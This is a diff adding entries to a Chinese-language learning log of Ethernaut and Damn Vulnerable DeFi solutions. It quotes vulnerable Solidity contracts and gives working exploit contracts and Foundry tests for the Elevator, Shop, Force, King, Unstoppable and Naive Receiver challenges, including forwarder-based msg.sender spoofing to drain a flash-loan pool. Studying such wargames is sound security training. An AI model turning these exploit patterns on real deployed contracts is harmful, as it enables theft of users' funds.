@@ -103,6 +103,409 @@ await web3.eth.getStorageAt("0xC2205dfcB5Ef96C4357ad8CDe94e5348E1e33f3D",1)
 
 
 
-### 2024.07.12
+### 2024.08.30
+
+#### Ethernaut - Elevator
+
+```
+
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+interface Building {
+    function isLastFloor(uint256) external returns (bool);
+}
+
+contract Elevator {
+    bool public top;
+    uint256 public floor;
+
+    function goTo(uint256 _floor) public {
+        Building building = Building(msg.sender);
+
+        if (!building.isLastFloor(_floor)) {
+            floor = _floor;
+            top = building.isLastFloor(floor);
+        }
+    }
+}
+```
+
+如果要top返回true，就要islastfloor第一次返回false，第二次返回true。building合约是调用的msg.sender，所以我们构造一个合约，其islastfloor函数满足这个逻辑就好，输入的参数不重要。
+
+```
+contract MockBuilding {
+    uint count=0;
+    function isLastFloor(uint256 a) external returns (bool){
+        if (count==0){
+            count++;
+            return false;
+        }else{
+            return true;
+        }
+    }
+    function callElevator(address addr) external{
+        Elevator(addr).goTo(0);
+    }
+}
+```
+
+
+### 2024.08.31
+
+Ethernaut 
+#### Shop
+
+```
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+interface Buyer {
+    function price() external view returns (uint256);
+}
+
+contract Shop {
+    uint256 public price = 100;
+    bool public isSold;
+
+    function buy() public {
+        Buyer _buyer = Buyer(msg.sender);
+
+        if (_buyer.price() >= price && !isSold) { //调用者的price>=100且从未buy过
+            isSold = true;
+            price = _buyer.price(); 
+        }
+    }
+}
+```
+
+要求price<100
+
+看起来类似电梯那个题目，但是buyer.price()是view的函数，不能更改状态。所以只能利用外部进行。发现isSold变量在两次调用price之间有更改。因此写合约利用这个isSold返回不同的bool值.
+
+```
+contract buyer{
+    address shop =0xc3Ce8A0921980063AadA4cf475CA91C7e8E81a63;
+    function price() external view returns (uint256){
+        if (Shop(shop).isSold()==false){
+            return 120;
+        }else{
+            return 0;
+        }
+    }
+    function callshop()external{
+        Shop(shop).buy();
+    }
+}
+```
+
+
+
+#### Force
+
+这一关的目标是使合约的余额大于0
+
+这个合约没有实现任何方法来接受以太。
+
+但是可以通过合约自毁的方式，指定将余额转给Force合约。
+
+POC:
+
+```
+pragma solidity ^0.8.0;
+
+contract mine{
+    constructor()payable {
+    }
+
+    function forcetransfer()public {
+        selfdestruct(payable(0xcaa382a24236a3FB17A40367e4FC0961214B8cF3));
+    }
+
+}
+```
+
+
+
+#### King
+
+要求成为king，阻止关卡重新声明王位
+
+
+```
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+contract King {
+    address king;
+    uint256 public prize;
+    address public owner;
+
+    constructor() payable {
+        owner = msg.sender;
+        king = msg.sender;
+        prize = msg.value;
+    }
+
+    receive() external payable {
+        require(msg.value >= prize || msg.sender == owner);
+        payable(king).transfer(msg.value);
+        king = msg.sender;
+        prize = msg.value;
+    }
+
+    function _king() public view returns (address) {
+        return king;
+    }
+}
+```
+
+给大于prize的value，或作为owner就可以改变king
+
+为了防止owner改变king，我们成为king之后，让这个transfer失败回滚.
+
+```
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+contract tobeking{
+
+    receive() external payable {
+        revert();
+    }
+    function start(address payable king)public payable{
+         (bool success, ) = king.call{value:1000000000000000}("");
+         require(success);
+    }
+}
+```
+
+不过要注意的是，不写receive函数也可以达到目的，即没法直接收款。另外，在转账的时候，必须用call，注意把address标记为payable。
+
+### 2024.09.02
+#### damnvulnerabledefi - Unstoppable
+
+There’s a tokenized vault with a million DVT tokens deposited. It’s offering flash loans for free, until the grace period ends.
+
+To catch any bugs before going 100% permissionless, the developers decided to run a live beta in testnet. There’s a monitoring contract to check liveness of the flashloan feature.
+
+Starting with 10 DVT tokens in balance, show that it’s possible to halt the vault. It must stop offering flash loans.
+
+我们初始有10 token，要让闪电贷项目暂停，看监控合约代码可知，需要监控合约调用闪电贷时发生回滚：
+
+```
+function checkFlashLoan(uint256 amount) external onlyOwner {
+        require(amount > 0);
+        address asset = address(vault.asset());
+        try vault.flashLoan(this, asset, amount, bytes("")) {
+            emit FlashLoanStatus(true);
+        } catch {//这里，如果回滚就会暂停
+            emit FlashLoanStatus(false);
+            vault.setPause(true);
+            vault.transferOwnership(owner);
+        }
+    }
+```
+
+然后看flashLoan函数：
+
+```
+function flashLoan(IERC3156FlashBorrower receiver, address _token, uint256 amount, bytes calldata data)
+        external
+        returns (bool)
+    {
+        if (amount == 0) revert InvalidAmount(0);
+        if (address(asset) != _token) revert UnsupportedCurrency(); 
+        uint256 balanceBefore = totalAssets();
+        if (convertToShares(totalSupply) != balanceBefore) revert InvalidBalance(); // 这里，如果返回false则会回滚
+        ......
+}
+
+    function convertToShares(uint256 assets) public view virtual returns (uint256) {
+        uint256 supply = totalSupply; // Saves an extra SLOAD if totalSupply is non-zero.
+
+        return supply == 0 ? assets : assets.mulDivDown(supply, totalAssets());// 一个是totalsuppy，一个是balance(this)，只要转账给合约即可，如：10*totalSupply/balance = 10*10eN/(10eN+1),
+    }
+```
+
+测试：
+
+```
+    function test_unstoppable() public checkSolvedByPlayer {
+        console.log(token.balanceOf(address(this)));
+        token.transfer(address(vault), 1e18);
+    }	
+```
+
+### 2024.09.03
+#### native receiver
+
+#### native-receiver
+
+题目
+
+```
+There’s a pool with 1000 WETH in balance offering flash loans. It has a fixed fee of 1 WETH. The pool supports meta-transactions by integrating with a permissionless forwarder contract. 
+
+A user deployed a sample contract with 10 WETH in balance. Looks like it can execute flash loans of WETH.
+
+All funds are at risk! Rescue all WETH from the user and the pool, and deposit it into the designated recovery account.
+```
+
+要求将deployer的10weth和合约中的1000weth取出。
+
+看了合约之后，发现有一个函数可疑：
+
+```
+    function _msgSender() internal view override returns (address) {
+        if (msg.sender == trustedForwarder && msg.data.length >= 20) {//@audit 只有trustedForwarder调用且data长度大于20时，认为msg.sender为传入参数的最后20bytes
+            return address(bytes20(msg.data[msg.data.length - 20:]));
+        } else {
+            return super._msgSender();
+        }
+    }
+```
+
+也就是只要msg.sender为trustedForwarder，合约的_msgSender可以由msg.data指定为任意地址（指定部署合约的owner为扣款地址）。
+
+而存取款就用到了_msgSender():
+
+```
+    function withdraw(uint256 amount, address payable receiver) external {
+        deposits[_msgSender()] -= amount;
+        totalDeposits -= amount;
+        weth.transfer(receiver, amount);
+    }
+```
+
+因此可以实现给指定地址转账，并且扣款额度为msg.data。
+
+BasicForwarder合约中提供了execute方法进行call操作，就可以转出合约里的1000WETH。
+
+```
+function execute(Request calldata request, bytes calldata signature) public payable returns (bool success) {
+        _checkRequest(request, signature);
+
+        nonces[request.from]++;
+
+        uint256 gasLeft;
+        uint256 value = request.value; // in wei
+        address target = request.target;
+        console.log("execute");
+        console.logBytes(request.data);
+        bytes memory payload = abi.encodePacked(request.data, request.from);//@audit 最后会+from，因此excute不能直接调用withdraw方法，否则最后msgsender会变成这个from，需要隔一层方法。
+        //pool合约中还提供了一个muticall方法，进行delegatecall，当本合约调用那个方法时，既可以通过msg.sender的验证，也可以隔一层方法，让此处的from不在成为withdraw的参数。
+         console.logBytes(payload);
+        uint256 forwardGas = request.gas;
+        assembly {
+            success := call(forwardGas, target, value, add(payload, 0x20), mload(payload), 0, 0) // don't copy returndata
+            gasLeft := gas()
+        }
+
+        if (gasLeft < request.gas / 63) {
+            assembly {
+                invalid()
+            }
+        }
+    }
+```
+
+
+
+除提取合约中存款以外，还有一点需要解决，即在receiver处还有10weth需要取出。
+
+```
+function flashLoan(IERC3156FlashBorrower receiver, address token, uint256 amount, bytes calldata data)
+        external
+        returns (bool)
+    {
+        if (token != address(weth)) revert UnsupportedCurrency();
+
+        weth.transfer(address(receiver), amount);
+        totalDeposits -= amount;
+
+        if (receiver.onFlashLoan(msg.sender, address(weth), amount, FIXED_FEE, data) != CALLBACK_SUCCESS) {
+            revert CallbackFailed();
+        }
+
+        uint256 amountWithFee = amount + FIXED_FEE;
+        weth.transferFrom(address(receiver), address(this), amountWithFee);
+        totalDeposits += amountWithFee;
+
+        deposits[feeReceiver] += FIXED_FEE;
+
+        return true;
+    }
+```
+
+观察发现：
+
+（1）借贷/偿还的receiver是任意指定的，因此可以传入任何地址作为借贷者，使其借贷并转走其weth作为手续费
+
+（2）手续费不是直接转到receiver地址的，而是转到pool合约中，记录到receiver名下。
+
+因此可以通过这种方式，将receiver的钱转移到deposits数组记录的金额下，再转走。
+
+看测试合约部署时，将deployer本身设为的receiver：
+
+```
+// Deploy pool and fund with ETH
+        pool = new NaiveReceiverPool{value: WETH_IN_POOL}(address(forwarder), payable(weth), deployer);
+```
+
+因此可以先通过闪电贷将这10weth转到deposits中（此时1010weth都记录在deposits[deployer]下，再通过BasicForwarder.execute调用withdraw转走。
+
+POC：
+
+```
+   function test_naiveReceiver() public checkSolvedByPlayer {
+        // address deployer = makeAddr("deployer");
+        // address recovery = makeAddr("recovery");
+        // address player;
+        // uint256 playerPk;
+
+        // NaiveReceiverPool pool;
+        // WETH weth;
+        // FlashLoanReceiver receiver;
+        // BasicForwarder forwarder;
+
+        for(uint i=0; i<10; i++){
+            pool.flashLoan(receiver, address(weth), 0, "0x");
+        }
+        console.logUint(weth.balanceOf(address(pool))/1e18);
+        console.logUint(pool.deposits(address(deployer))/1e18);//确认1010weth确实到pool
+        bytes[] memory callDatas = new bytes[](1);
+        callDatas[0] = abi.encodePacked(
+            abi.encodeCall(NaiveReceiverPool.withdraw, (1010e18, payable(recovery))),
+            abi.encode(deployer)
+        );
+        bytes memory callData;
+        callData = abi.encodeCall(pool.multicall, callDatas);
+        BasicForwarder.Request memory request = BasicForwarder.Request(
+            player,
+            address(pool),
+            0,
+            30000000,
+            forwarder.nonces(player),
+            callData,
+            1 days
+        );
+        bytes32 requestHash = keccak256(
+            abi.encodePacked(
+                "\x19\x01",
+                forwarder.domainSeparator(),
+                forwarder.getDataHash(request)
+            )
+        );
+        (uint8 v, bytes32 r, bytes32 s)= vm.sign(playerPk ,requestHash);
+        bytes memory signature = abi.encodePacked(r, s, v);
+        require(forwarder.execute(request, signature)); 
+    }
+```
+
+
+
+### 2024.09.04
+
 
 <!-- Content_END -->
